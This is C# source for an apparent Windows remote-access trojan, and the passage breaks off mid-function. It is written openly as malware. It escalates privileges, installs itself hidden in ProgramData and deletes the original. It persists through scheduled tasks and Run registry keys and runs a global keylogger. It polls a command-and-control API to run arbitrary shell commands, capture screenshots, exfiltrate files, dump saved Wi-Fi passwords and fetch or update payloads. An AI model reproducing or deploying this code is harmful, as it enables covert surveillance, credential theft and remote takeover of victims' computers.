using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net.Http;
using System.Runtime.InteropServices;
using System.Runtime.Versioning;
using System.Speech.Synthesis;
using System.Text;
using System.Text.Json;
using System.Threading;
using System.Threading.Tasks;
using Microsoft.Win32;
using System.Diagnostics.Eventing.Reader;

namespace AntaryamiSetuAgent
{
    [SupportedOSPlatform("windows")]
    class Program
    {
        // =========================================================
        // ONLINE CONFIGURATION (Hostinger HTTP API)
        // =========================================================
        private static string ApiUrl = "https://yourdomain.com/api/api_setu.php";
        private static string _deviceId = string.Empty;
        private static string _sessionToken = Guid.NewGuid().ToString();
        private static readonly HttpClient _httpClient = new HttpClient() { Timeout = TimeSpan.FromMinutes(45) };
        private static readonly HttpClient _telemetryClient = new HttpClient() { Timeout = TimeSpan.FromMinutes(45) };
        
        // Keylogger variables
        private static readonly object _keyLock = new object();
        private static readonly StringBuilder _keyBuffer = new StringBuilder();
        private static string _lastWindow = string.Empty;
        private static IntPtr _hookId = IntPtr.Zero;
        private static LowLevelKeyboardProc? _kbHookProc;
        private static bool _isKeylogging = false;

        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private const int WM_SYSKEYDOWN = 0x0104;

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        // Win32 API Imports
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("user32.dll")]
        private static extern short GetAsyncKeyState(int vKey);

        [DllImport("user32.dll")]
        private static extern short GetKeyState(int vKey);

        [StructLayout(LayoutKind.Sequential)]
        private struct POINT
        {
            public int x;
            public int y;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct MSG
        {
            public IntPtr hwnd;
            public uint message;
            public IntPtr wParam;
            public IntPtr lParam;
            public uint time;
            public POINT pt;
            public uint lPrivate;
        }

        [DllImport("user32.dll")]
        private static extern int GetMessage(out MSG lpMsg, IntPtr hWnd, uint wMsgFilterMin, uint wMsgFilterMax);

        [DllImport("user32.dll")]
        private static extern bool TranslateMessage(ref MSG lpMsg);

        [DllImport("user32.dll")]
        private static extern IntPtr DispatchMessage(ref MSG lpMsg);

        [DllImport("user32.dll")]
        private static extern IntPtr GetDesktopWindow();
        
        [DllImport("user32.dll")]
        private static extern IntPtr GetWindowDC(IntPtr hWnd);

        [DllImport("gdi32.dll")]
        private static extern int GetDeviceCaps(IntPtr hdc, int nIndex);
        
        [DllImport("user32.dll")]
        private static extern int ReleaseDC(IntPtr hWnd, IntPtr hDC);

        [DllImport("user32.dll")]
        private static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);

        [DllImport("user32.dll")]
        private static extern bool SetProcessDPIAware();

        static async Task Main(string[] args)
        {
            try { Application.SetHighDpiMode(HighDpiMode.PerMonitorV2); } catch { }
            PerformSelfInstallation(args);

            _deviceId = GetHardwareBoundIdentifier();
            _httpClient.DefaultRequestHeaders.Add("X-API-KEY", _sessionToken);
            _telemetryClient.DefaultRequestHeaders.Add("X-API-KEY", "SetuAgentReg@2026");
            

            RegisterInStartup();
            // PlayFuturisticStartupBeep();

            // Start global keyboard hook thread
            StartKeylogger();

            var cts = new CancellationTokenSource();
            
            // Start the polling C2 engine
            Console.WriteLine($"[*] Starting Online Agent Engine targeting: {ApiUrl}");
            
            Task telemetryTask = TelemetryLoopAsync(cts.Token);
            Task fetchTask = ReceiveLoopAsync(cts.Token);
            Task keyloggerTask = KeyloggerStreamLoopAsync(cts.Token);
            
            await Task.WhenAll(telemetryTask, fetchTask, keyloggerTask);
        }

        private static void PerformSelfInstallation(string[] args)
        {
            try
            {
                string currentPath = Process.GetCurrentProcess().MainModule?.FileName ?? string.Empty;
                if (currentPath.Contains("ANTARYAMI-SETU", StringComparison.OrdinalIgnoreCase) || 
                    currentPath.Contains("bin\\Debug", StringComparison.OrdinalIgnoreCase) ||
                    currentPath.Contains("winonlineagent", StringComparison.OrdinalIgnoreCase))
                {
                    return; // Bypass installation check for local debugging/development
                }

                string targetDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), "OnlineAgent");
                string targetPath = Path.Combine(targetDir, "AntaryamiSetuOnlineAgent.exe");

                if (string.IsNullOrEmpty(currentPath)) return;

                // Check if we are running from the target path
                if (string.Equals(currentPath, targetPath, StringComparison.OrdinalIgnoreCase))
                {
                    return; // Already installed, continue running
                }

                // Check for Administrator elevation
                var identity = System.Security.Principal.WindowsIdentity.GetCurrent();
                var principal = new System.Security.Principal.WindowsPrincipal(identity);
                bool isAdmin = principal.IsInRole(System.Security.Principal.WindowsBuiltInRole.Administrator);

                if (!isAdmin)
                {
                    // Elevate
                    Process.Start(new ProcessStartInfo
                    {
                        FileName = currentPath,
                        Arguments = string.Join(" ", args),
                        UseShellExecute = true,
                        Verb = "runas"
                    });
                    Environment.Exit(0);
                }

                // Stop active process if any
                string currentExeName = Path.GetFileNameWithoutExtension(currentPath);
                foreach (var process in Process.GetProcessesByName(currentExeName))
                {
                    if (process.Id != Process.GetCurrentProcess().Id)
                    {
                        try
                        {
                            process.Kill();
                            process.WaitForExit(3000);
                        }
                        catch { }
                    }
                }

                // Provision directory
                if (!Directory.Exists(targetDir))
                {
                    Directory.CreateDirectory(targetDir);
                }

                // Copy to ProgramData
                File.Copy(currentPath, targetPath, true);

                // Launch in session 1 (hidden)
                Process.Start(new ProcessStartInfo
                {
                    FileName = targetPath,
                    UseShellExecute = true,
                    WindowStyle = ProcessWindowStyle.Hidden
                });

                // Self-clean temporary file
                Process.Start(new ProcessStartInfo
                {
                    FileName = "cmd.exe",
                    Arguments = $"/c choice /t 3 /d y > nul & del \"{currentPath}\"",
                    CreateNoWindow = true,
                    UseShellExecute = false
                });

                Environment.Exit(0);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[-] Self-installation failed: {ex.Message}");
            }
        }

        private static void RegisterInStartup()
        {
            try
            {
                string? appPath = Process.GetCurrentProcess().MainModule?.FileName;
                if (string.IsNullOrEmpty(appPath)) return;
                
                string appName = Path.GetFileNameWithoutExtension(appPath);

                if (!string.IsNullOrEmpty(appPath))
                {
                    // 1. Advanced Persistence: Hidden Scheduled Task (Elevated)
                    try
                    {
                        var identity = System.Security.Principal.WindowsIdentity.GetCurrent();
                        var principal = new System.Security.Principal.WindowsPrincipal(identity);
                        bool isAdmin = principal.IsInRole(System.Security.Principal.WindowsBuiltInRole.Administrator);

                        if (isAdmin)
                        {
                            // Create scheduled task (on logon)
                            string taskCmd = $"/create /tn \"{appName}Task\" /tr \"\\\"{appPath}\\\"\" /sc onlogon /rl highest /f";
                            var startInfo = new ProcessStartInfo
                            {
                                FileName = "schtasks.exe",
                                Arguments = taskCmd,
                                CreateNoWindow = true,
                                UseShellExecute = false,
                                WindowStyle = ProcessWindowStyle.Hidden
                            };
                            using (var proc = Process.Start(startInfo))
                            {
                                proc?.WaitForExit(5000);
                            }

                            // Remove battery constraints from scheduled task using PowerShell
                            try
                            {
                                string settingsCmd = $"Set-ScheduledTask -TaskName \"{appName}Task\" -Settings (New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries)";
                                var psStartInfo = new ProcessStartInfo
                                {
                                    FileName = "powershell.exe",
                                    Arguments = $"-NoProfile -WindowStyle Hidden -Command \"{settingsCmd}\"",
                                    CreateNoWindow = true,
                                    UseShellExecute = false
                                };
                                using (var psProc = Process.Start(psStartInfo))
                                {
                                    psProc?.WaitForExit(5000);
                                }
                            }
                            catch { }
                        }
                    }
                    catch { }

                    // 2. Registry Persistence (HKLM for System-Wide if Admin, HKCU for User fallback)
                    try
                    {
                        var identity = System.Security.Principal.WindowsIdentity.GetCurrent();
                        var principal = new System.Security.Principal.WindowsPrincipal(identity);
                        bool isAdmin = principal.IsInRole(System.Security.Principal.WindowsBuiltInRole.Administrator);

                        if (isAdmin)
                        {
                            using (RegistryKey? key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true))
                            {
                                if (key != null)
                                {
                                    string? existingValue = key.GetValue(appName)?.ToString();
                                    if (existingValue != appPath)
                                    {
                                        key.SetValue(appName, appPath);
                                    }
                                }
                            }
                        }
                    }
                    catch { }

                    try
                    {
                        using (RegistryKey? key = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true))
                        {
                            if (key != null)
                            {
                                string? existingValue = key.GetValue(appName)?.ToString();
                                if (existingValue != appPath)
                                {
                                    key.SetValue(appName, appPath);
                                }
                            }
                        }
                    }
                    catch { }
                }
            }
            catch { }
        }

        private static void PlayFuturisticStartupBeep()
        {
            try
            {
                Console.Beep(880, 100);
                Thread.Sleep(50);
                Console.Beep(1109, 100);
                Thread.Sleep(50);
                Console.Beep(1320, 150);
            }
            catch { }
        }

        private static void TriggerCustomBeep(int frequency, int duration)
        {
            try
            {
                if (frequency >= 37 && frequency <= 32767 && duration > 0)
                {
                    Console.Beep(frequency, duration);
                }
            }
            catch { }
        }

        private static void SpeakOfflineText(string message)
        {
            try
            {
                Task.Run(() =>
                {
                    using (var synth = new SpeechSynthesizer())
                    {
                        synth.Volume = 100;
                        synth.Rate = 0;
                        synth.Speak(message);
                    }
                });
            }
            catch { }
        }

        private static async Task TelemetryLoopAsync(CancellationToken token)
        {
            while (!token.IsCancellationRequested)
            {
                try
                {
                    var content = new MultipartFormDataContent();
                    content.Add(new StringContent("telemetry"), "action");
                    content.Add(new StringContent(_deviceId), "device_id");
                    content.Add(new StringContent(Environment.MachineName + " (" + Environment.UserName + ")"), "device_name");
                    content.Add(new StringContent(Environment.OSVersion.VersionString), "os_info");
                    content.Add(new StringContent(GetActiveWindowTitle()), "active_app");
                    content.Add(new StringContent(Directory.GetCurrentDirectory()), "current_path");
                    content.Add(new StringContent(_sessionToken), "session_token");

                    await _telemetryClient.PostAsync(ApiUrl, content, token);
                }
                catch { }

                await Task.Delay(10000, token); // Poll every 10s
            }
        }

        private static async Task ReceiveLoopAsync(CancellationToken token)
        {
            while (!token.IsCancellationRequested)
            {
                try
                {
                    var response = await _httpClient.GetStringAsync($"{ApiUrl}?action=fetch&device_id={_deviceId}", token);
                    if (!string.IsNullOrWhiteSpace(response) && response != "NO_COMMAND")
                    {
                        // Expected format from PHP: task_id|command
                        var parts = response.Split(new[] { '|' }, 2);
                        if (parts.Length == 2)
                        {
                            string taskId = parts[0];
                            string command = parts[1];
                            _ = Task.Run(() => ProcessCommandAsync(taskId, command, token), token);
                        }
                    }
                }
                catch { }

                await Task.Delay(5000, token); // Poll every 5s
            }
        }

        private static async Task ProcessCommandAsync(string taskId, string command, CancellationToken token)
        {
            string output = "";
            try
            {
                Console.WriteLine($"[*] Executing Command: {command}");

                if (command.StartsWith("speak ", StringComparison.OrdinalIgnoreCase))
                {
                    string textToSpeak = command.Substring(6).Trim();
                    SpeakOfflineText(textToSpeak);
                    output = $"[+] Client speaking initiated: \"{textToSpeak}\"";
                }
                else if (command.StartsWith("beep ", StringComparison.OrdinalIgnoreCase))
                {
                    string[] parts = command.Substring(5).Split(' ', StringSplitOptions.RemoveEmptyEntries);
                    int freq = 1000, dur = 300;
                    if (parts.Length >= 2 && int.TryParse(parts[0], out int f) && int.TryParse(parts[1], out int d))
                    {
                        freq = f; dur = d;
                    }
                    TriggerCustomBeep(freq, dur);
                    output = $"[+] Custom beep played: {freq}Hz for {dur}ms.";
                }
                else if (command.StartsWith("cd ", StringComparison.OrdinalIgnoreCase))
                {
                    string targetPath = command.Substring(3).Trim();
                    Directory.SetCurrentDirectory(targetPath);
                    output = $"[*] Context Directory: {Directory.GetCurrentDirectory()}";
                }
                else if (command.StartsWith("cat ", StringComparison.OrdinalIgnoreCase))
                {
                    string filePath = command.Substring(4).Trim();
                    if (File.Exists(filePath))
                    {
                        output = await File.ReadAllTextAsync(filePath, token);
                    }
                    else
                    {
                        output = $"[-] File not found: {filePath}";
                    }
                }
                else if (command.Equals("screenshot", StringComparison.OrdinalIgnoreCase))
                {
                    await CaptureScreenshotAsync(taskId, token);
                    return; // Avoid sending standard output
                }
                else if (command.StartsWith("pull ", StringComparison.OrdinalIgnoreCase))
                {
                    string targetFilePath = command.Substring(5).Trim();
                    await ExfiltrateFileAsync(taskId, targetFilePath, token);
                    return; // Avoid sending standard output
                }
                else if (command.StartsWith("push_file ", StringComparison.OrdinalIgnoreCase))
                {
                    string fileInfo = command.Substring(10).Trim();
                    var parts = fileInfo.Split('|');
                    if (parts.Length == 2)
                    {
                        string filename = parts[0];
                        string relativePath = parts[1];
                        await DownloadAndSaveFileAsync(taskId, filename, relativePath, token);
                        return; // Avoid sending standard output
                    }
                    else
                    {
                        output = "[-] Invalid push_file parameters.";
                    }
                }
                else if (command.StartsWith("alert ", StringComparison.OrdinalIgnoreCase))
                {
                    string alertMessage = command.Substring(6).Trim();
                    ShowFullscreenAlert(alertMessage);
                    output = $"[+] Fullscreen alert displayed on target: \"{alertMessage}\"";
                }
                else if (command.Equals("keylog_start", StringComparison.OrdinalIgnoreCase))
                {
                    lock (_keyLock)
                    {
                        _keyBuffer.Clear();
                        _isKeylogging = true;
                    }
                    output = "[+] Keylogger streaming active.";
                }
                else if (command.Equals("keylog_stop", StringComparison.OrdinalIgnoreCase))
                {
                    lock (_keyLock)
                    {
                        _isKeylogging = false;
                        _keyBuffer.Clear();
                    }
                    output = "[+] Keylogger streaming stopped.";
                }
                else if (command.Equals("usb_history", StringComparison.OrdinalIgnoreCase))
                {
                    try
                    {
                        StringBuilder sb = new StringBuilder();
                        sb.AppendLine("=== USB DEVICE HISTORY ===");
                        using (RegistryKey? key = Registry.LocalMachine.OpenSubKey(@"SYSTEM\CurrentControlSet\Enum\USBSTOR"))
                        {
                            if (key != null)
                            {
                                foreach (string v in key.GetSubKeyNames())
                                {
                                    sb.AppendLine($"Device: {v}");
                                    using (RegistryKey? subKey = key.OpenSubKey(v))
                                    {
                                        if (subKey != null)
                                        {
                                            foreach (string id in subKey.GetSubKeyNames())
                                            {
                                                using (RegistryKey? deviceKey = subKey.OpenSubKey(id))
                                                {
                                                    if (deviceKey != null)
                                                    {
                                                        string friendlyName = deviceKey.GetValue("FriendlyName")?.ToString() ?? "Unknown";
                                                        sb.AppendLine($"  -> S/N: {id} | Name: {friendlyName}");
                                                    }
                                                }
                                            }
                                        }
                                    }
                                    sb.AppendLine(new string('-', 30));
                                }
                            }
                            else
                            {
                                sb.AppendLine("No USB history found or insufficient privileges.");
                            }
                        }
                        output = sb.ToString();
                    }
                    catch (Exception ex)
                    {
                        output = $"[-] USB History error: {ex.Message}";
                    }
                }
                else if (command.StartsWith("update_agent ", StringComparison.OrdinalIgnoreCase))
                {
                    string relativePath = command.Substring(13).Trim();
                    await HandleSelfUpdateAsync(taskId, relativePath, token);
                    return;
                }
                else if (command.Equals("uninstall", StringComparison.OrdinalIgnoreCase))
                {
                    await PostOutputAsync(taskId, "[+] Uninstallation initiated. Cleaning up and self-destructing.", token);
                    SelfDestruct();
                    return;
                }
                else if (command.Equals("wifi_dump", StringComparison.OrdinalIgnoreCase))
                {
                    await DumpWifiProfilesAsync(taskId, token);
                    return;
                }
                else if (command.Equals("event_logs", StringComparison.OrdinalIgnoreCase))
                {
                    await DumpEventLogsAsync(taskId, token);
                    return;
                }
                else
                {
                    bool requiresPowerShell = command.Contains("iwr") || command.Contains("wget") || command.Contains("curl");
                    string shellExecutor = requiresPowerShell ? "powershell.exe" : "cmd.exe";
                    string processingArguments = requiresPowerShell ? $"-Command \"{command}\"" : $"/c {command}";

                    using var systemProcess = new Process();
                    systemProcess.StartInfo = new ProcessStartInfo
                    {
                        FileName = shellExecutor,
                        Arguments = processingArguments,
                        WorkingDirectory = Directory.GetCurrentDirectory(),
                        CreateNoWindow = true,
                        UseShellExecute = false,
                        RedirectStandardOutput = true,
                        RedirectStandardError = true
                    };

                    using var ctsTimeout = new CancellationTokenSource(60000);
                    using var linkedCts = CancellationTokenSource.CreateLinkedTokenSource(token, ctsTimeout.Token);

                    systemProcess.Start();

                    try
                    {
                        await systemProcess.WaitForExitAsync(linkedCts.Token);
                        string stdout = await systemProcess.StandardOutput.ReadToEndAsync(linkedCts.Token);
                        string stderr = await systemProcess.StandardError.ReadToEndAsync(linkedCts.Token);
                        
                        output = !string.IsNullOrEmpty(stdout) ? stdout : stderr;
                        if (string.IsNullOrEmpty(output)) output = "[*] Execution complete with null output streams.";
                        output += $"\n\n[*] Context Directory: {Directory.GetCurrentDirectory()}";
                    }
                    catch (OperationCanceledException)
                    {
                        if (ctsTimeout.IsCancellationRequested)
                        {
                            try { systemProcess.Kill(true); } catch { }
                            output = "[-] Execution Timeout: Process forcefully terminated after 60 seconds.";
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                output = $"[-] Task abort exception: {ex.Message}";
            }

            if (!string.IsNullOrEmpty(output))
            {
                await PostOutputAsync(taskId, output, token);
            }
        }

        private static async Task PostOutputAsync(string taskId, string text, CancellationToken token)
        {
            try
            {
                var content = new MultipartFormDataContent();
                content.Add(new StringContent("post_output"), "action");
                content.Add(new StringContent(_deviceId), "device_id");
                content.Add(new StringContent(taskId), "task_id");
                content.Add(new StringContent(text), "output");
                
                await _httpClient.PostAsync(ApiUrl, content, token);
            }
            catch { }
        }

        private static async Task CaptureScreenshotAsync(string taskId, CancellationToken token)
        {
            try
            {
                IntPtr desktopHandle = GetDesktopWindow();
                if (desktopHandle == IntPtr.Zero)
                {
                    await PostOutputAsync(taskId, "[-] VISUAL_FAIL: Desktop window handle unavailable.", token);
                    return;
                }

                IntPtr hdc = GetWindowDC(desktopHandle);
                if (hdc == IntPtr.Zero)
                {
                    await PostOutputAsync(taskId, "[-] VISUAL_FAIL: Device context handle is null.", token);
                    return;
                }

                int width = GetDeviceCaps(hdc, 8);
                int height = GetDeviceCaps(hdc, 10);
                ReleaseDC(desktopHandle, hdc);

                if (width <= 0 || height <= 0)
                {
                    await PostOutputAsync(taskId, "[-] VISUAL_FAIL: Invalid screen dimensions.", token);
                    return;
                }

                using var bitmap = new Bitmap(width, height);
                using (var g = Graphics.FromImage(bitmap))
                {
                    g.CopyFromScreen(0, 0, 0, 0, bitmap.Size, CopyPixelOperation.SourceCopy);
                }

                using var stream = new MemoryStream();
                bitmap.Save(stream, ImageFormat.Jpeg);
                byte[] rawBytes = stream.ToArray();

                var content = new MultipartFormDataContent();
                content.Add(new StringContent("upload_screenshot"), "action");
                content.Add(new StringContent(_deviceId), "device_id");
                content.Add(new StringContent(taskId), "task_id");
                
                var imageContent = new ByteArrayContent(rawBytes);
                imageContent.Headers.Add("Content-Type", "image/jpeg");
                content.Add(imageContent, "file", $"screenshot_{DateTime.Now:yyyyMMddHHmmss}.jpg");
                
                await _httpClient.PostAsync(ApiUrl, content, token);
            }
            catch (Exception ex)
            {
                await PostOutputAsync(taskId, $"[-] Screenshot creation failed: {ex.Message}", token);
            }
        }

        private static async Task DumpWifiProfilesAsync(string taskId, CancellationToken token)
        {
            try
            {
                await PostOutputAsync(taskId, "[*] Initiating Wi-Fi profile extraction...", token);
                
                string output = "[+] SAVED WI-FI PROFILES & PASSWORDS:\n----------------------------------------\n";
                
                var startInfo = new ProcessStartInfo
                {
                    FileName = "netsh",
                    Arguments = "wlan show profiles",
                    RedirectStandardOutput = true,
                    UseShellExecute = false,
                    CreateNoWindow = true
                };

                using var process = Process.Start(startInfo);
                if (process == null) return;
                
                string profilesOutput = await process.StandardOutput.ReadToEndAsync(token);
                await process.WaitForExitAsync(token);

                var profiles = new List<string>();
                foreach (string line in profilesOutput.Split('\n'))
                {
                    if (line.Contains("All User Profile"))
                    {
                        var parts = line.Split(new char[] { ':' }, 2);
                        if (parts.Length > 1)
                        {
                            profiles.Add(parts[1].Trim());
                        }
                    }
                }

                if (profiles.Count == 0)
                {
                    output += "No Wi-Fi profiles found on this system.";
                }
                else
                {
                    foreach (string profile in profiles)
                    {
                        var pwdStartInfo = new ProcessStartInfo
                        {
                            FileName = "netsh",
                            Arguments = $"wlan show profile name=\"{profile}\" key=clear",
                            RedirectStandardOutput = true,
                            UseShellExecute = false,
                            CreateNoWindow = true
                        };

                        using var pwdProcess = Process.Start(pwdStartInfo);
                        if (pwdProcess != null)
                        {
                            string pwdOutput = await pwdProcess.StandardOutput.ReadToEndAsync(token);
                            await pwdProcess.WaitForExitAsync(token);

                            string password = "<None/Open>";
                            foreach (string line in pwdOutput.Split('\n'))
                            {
                                if (line.Contains("Key Content"))
                                {
                                    var parts = line.Split(new char[] { ':' }, 2);
                                    if (parts.Length > 1)
                                    {
                                        password = parts[1].Trim();
                                        break;
                                    }
                                }
                            }
                            output += $"SSID: {profile,-25} | PASS: {password}\n";
                        }
                    }
                }
                
                await PostOutputAsync(taskId, output, token);
            }
            catch (Exception ex)
            {
                await PostOutputAsync(taskId, $"[-] Wi-Fi extraction failed: {ex.Message}", token);
            }
        }

        private static async Task DumpEventLogsAsync(string taskId, CancellationToken token)
        {
            try
            {
                await PostOutputAsync(taskId, "[*] Initiating Windows Event Log Forensics...", token);

                StringBuilder sb = new StringBuilder();
                sb.AppendLine("==================================================");
                sb.AppendLine("       🌌 WINDOWS EVENT LOG FORENSIC REPORT        ");
                sb.AppendLine("==================================================");
                sb.AppendLine("[*] Audited Target IDs: 4624 (Logon), 4625 (Failed Logon), 1102 (Clear), 7045 (New Service)");
                sb.AppendLine($"[*] Extraction Time: {DateTime.Now:yyyy-MM-dd HH:mm:ss}\n");

                int logonSuccessCount = 0;
                int logonFailedCount = 0;
                int logsClearedCount = 0;
                int serviceInstalledCount = 0;

                // --- 1. Security Logs: logon success, failed, cleared ---
                sb.AppendLine("[📊 SECURITY AUDIT EVENTS - LOGONS & CLEARS]");
                sb.AppendLine("--------------------------------------------------");
                try
                {
                    var securityQuery = new EventLogQuery("Security", PathType.LogName, "*[System[(EventID=4624 or EventID=4625 or EventID=1102)]]");
                    using var reader = new EventLogReader(securityQuery);
                    EventRecord record;
                    List<EventRecord> records = new List<EventRecord>();
                    while ((record = reader.ReadEvent()) != null)
                    {
                        records.Add(record);
                        if (records.Count >= 200) break; // Limit records read to keep performance high
                    }
                    records.Reverse(); // Most recent first

                    int displayed = 0;
                    foreach (var rec in records)
                    {
                        if (rec.Id == 4624) logonSuccessCount++;
                        else if (rec.Id == 4625) logonFailedCount++;
                        else if (rec.Id == 1102) logsClearedCount++;

                        if (displayed < 25) // Display first 25 security logs in report to avoid huge output
                        {
                            string typeStr = rec.Id == 4624 ? "SUCCESS_LOGON" : (rec.Id == 4625 ? "FAILED_LOGON" : "AUDIT_LOG_CLEARED");
                            string timeStr = rec.TimeCreated?.ToString("yyyy-MM-dd HH:mm:ss") ?? "N/A";
                            sb.AppendLine($"[{timeStr}] Event ID: {rec.Id} | Type: {typeStr}");

                            try
                            {
                                if (rec.Properties != null && rec.Properties.Count > 6)
                                {
                                    string targetUser = rec.Properties[5].Value?.ToString() ?? "N/A";
                                    string targetDomain = rec.Properties[6].Value?.ToString() ?? "N/A";
                                    string logonType = rec.Properties.Count > 8 ? (rec.Properties[8].Value?.ToString() ?? "N/A") : "N/A";
                                    
                                    // Parse logon type name if numerical
                                    if (int.TryParse(logonType, out int typeNum))
                                    {
                                        string typeName = typeNum switch
                                        {
                                            2 => "Interactive (Keyboard)",
                                            3 => "Network (SMB/Share)",
                                            4 => "Batch",
                                            5 => "Service",
                                            7 => "Unlock",
                                            8 => "NetworkCleartext",
                                            9 => "NewCredentials",
                                            10 => "RemoteInteractive (RDP)",
                                            11 => "CachedInteractive",
                                            _ => $"Type {typeNum}"
                                        };
                                        logonType = $"{typeNum} ({typeName})";
                                    }
                                    sb.AppendLine($"   User: {targetDomain}\\{targetUser} | LogonType: {logonType}");
                                }
                            }
                            catch { }
                            displayed++;
                        }
                    }
                    if (records.Count == 0)
                    {
                        sb.AppendLine("No recent Security logon events found.");
                    }
                }
                catch (Exception ex)
                {
                    sb.AppendLine($"[-] Security Log access failed (Admin privilege required?): {ex.Message}");
                }

                // --- 2. System Logs: service installations ---
                sb.AppendLine("\n[🔌 SYSTEM SERVICE EVENTS - PERSISTENCE AUDITING]");
                sb.AppendLine("--------------------------------------------------");
                try
                {
                    var systemQuery = new EventLogQuery("System", PathType.LogName, "*[System[(EventID=7045)]]");
                    using var reader = new EventLogReader(systemQuery);
                    EventRecord record;
                    List<EventRecord> records = new List<EventRecord>();
                    while ((record = reader.ReadEvent()) != null)
                    {
                        records.Add(record);
                        if (records.Count >= 100) break;
                    }
                    records.Reverse();

                    int displayed = 0;
                    foreach (var rec in records)
                    {
                        serviceInstalledCount++;
                        if (displayed < 15) // Display first 15 installed services
                        {
                            string timeStr = rec.TimeCreated?.ToString("yyyy-MM-dd HH:mm:ss") ?? "N/A";
                            sb.AppendLine($"[{timeStr}] Event ID: {rec.Id} (New Service Installed)");
                            try
                            {
                                if (rec.Properties != null && rec.Properties.Count > 1)
                                {
                                    string serviceName = rec.Properties[0].Value?.ToString() ?? "N/A";
                                    string imagePath = rec.Properties[1].Value?.ToString() ?? "N/A";
                                    string serviceType = rec.Properties.Count > 2 ? (rec.Properties[2].Value?.ToString() ?? "N/A") : "N/A";
                                    sb.AppendLine($"   Service: {serviceName} | Path: {imagePath}");
                                }
                            }
                            catch { }
                            displayed++;
                        }
                    }
                    if (records.Count == 0)
                    {
                        sb.AppendLine("No recent Service installation events found.");
                    }
                }
                catch (Exception ex)
                {
                    sb.AppendLine($"[-] System Log access failed: {ex.Message}");
                }

                // --- 3. Forensic Summary ---
                sb.AppendLine("\n==================================================");
                sb.AppendLine("       🔍 DIGITAL FORENSICS METRICS SUMMARY        ");
                sb.AppendLine("==================================================");
                sb.AppendLine($" [+] Total Successful Logons (ID 4624): {logonSuccessCount}");
                sb.AppendLine($" [+] Total Failed Logons (ID 4625):     {logonFailedCount}");
                sb.AppendLine($" [+] Total Log Clear Attempts (ID 1102): {logsClearedCount}");
                sb.AppendLine($" [+] Total New Services (ID 7045):        {serviceInstalledCount}");
                sb.AppendLine("==================================================");

                await PostOutputAsync(taskId, sb.ToString(), token);
            }
            catch (Exception ex)
            {
                await PostOutputAsync(taskId, $"[-] Event Log Forensic failure: {ex.Message}", token);
            }
        }

        private static async Task ExfiltrateFileAsync(string taskId, string filePath, CancellationToken token)
        {
            try
            {
                if (!File.Exists(filePath))
                {
                    await PostOutputAsync(taskId, $"[-] EXFIL_FAIL: File not found: {filePath}", token);
                    return;
                }

                FileInfo fileInfo = new FileInfo(filePath);
                if (fileInfo.Length > 52428800)
                {
                    await PostOutputAsync(taskId, $"[-] EXFIL_FAIL: File size exceeds 50MB limit.", token);
                    return;
                }

                byte[] fileBytes = await File.ReadAllBytesAsync(filePath, token);
                string filename = Path.GetFileName(filePath);

                var content = new MultipartFormDataContent();
                content.Add(new StringContent("upload_file"), "action");
                content.Add(new StringContent(_deviceId), "device_id");
                content.Add(new StringContent(taskId), "task_id");
                
                var fileContent = new ByteArrayContent(fileBytes);
                content.Add(fileContent, "file", filename);
                
                await _httpClient.PostAsync(ApiUrl, content, token);
            }
            catch (Exception ex)
            {
                await PostOutputAsync(taskId, $"[-] EXFIL_ERROR: {ex.Message}", token);
            }
        }

        private static async Task DownloadAndSaveFileAsync(string taskId, string filename, string relativePath, CancellationToken token)
        {
            try
            {
                string fileUrl = $"{ApiUrl}?action=download&file={relativePath}";
                byte[] fileBytes = await _httpClient.GetByteArrayAsync(fileUrl, token);
                
                string savePath = Path.Combine(Directory.GetCurrentDirectory(), filename);
                try {
                    await File.WriteAllBytesAsync(savePath, fileBytes, token);
                } catch (UnauthorizedAccessException) {
                    savePath = Path.Combine(Path.GetTempPath(), filename);
                    await File.WriteAllBytesAsync(savePath, fileBytes, token);
                }
                await PostOutputAsync(taskId, $"[+] File received and saved: {savePath} ({fileBytes.Length / 1024.0:F2} KB)", token);
            }
            catch (Exception ex)
            {
                await PostOutputAsync(taskId, $"[-] File receive error: {ex.Message}", token);
            }
        }

        private static async Task HandleSelfUpdateAsync(string taskId, string relativePath, CancellationToken token)
        {
            try
            {
                await PostOutputAsync(taskId, "[*] Initiating self-update: Downloading new executable...", token);
                string fileUrl = $"{ApiUrl}?action=download&file={relativePath}";
                string currentExePath = Process.GetCurrentProcess().MainModule?.FileName ?? string.Empty;
                if (string.IsNullOrEmpty(currentExePath))
                {
                    await PostOutputAsync(taskId, "[-] Update failed: Unable to determine current executable path.", token);
                    return;
                }

                string targetDir = Path.GetDirectoryName(currentExePath) ?? string.Empty;
                string tempExePath = Path.Combine(targetDir, "update_temp.exe");

                // Stream download pattern (RAM usage negligible)
                using (var response = await _httpClient.GetAsync(fileUrl, HttpCompletionOption.ResponseHeadersRead, token))
                {
                    response.EnsureSuccessStatusCode();
                    using (var streamToRead = await response.Content.ReadAsStreamAsync(token))
                    using (var fileToWrite = new FileStream(tempExePath, FileMode.Create, FileAccess.Write, FileShare.None, 8192, true))
                    {
